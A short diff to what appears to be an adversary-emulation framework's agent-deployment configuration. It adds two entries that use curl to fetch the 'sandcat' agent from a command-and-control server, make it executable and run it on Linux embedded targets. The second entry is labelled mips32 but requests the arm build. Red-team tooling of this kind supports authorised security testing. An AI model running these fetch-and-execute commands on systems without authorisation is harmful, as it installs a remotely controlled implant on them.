@@ -56,6 +56,18 @@
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
               chmod +x sandcat.go;
               ./sandcat.go -c2 GIST -v
+          - description: Deploy on a mips32 based embedded target
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:mips32" $server/file/download > sandcat.go;
+              chmod +x sandcat.go;
+              ./sandcat.go -server $server -group red -v
+          - description: Deploy on a mips32 based embedded target
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:arm" $server/file/download > sandcat.go;
+              chmod +x sandcat.go;
+              ./sandcat.go -server $server -group red -v
     windows:
       psh:
         command: |
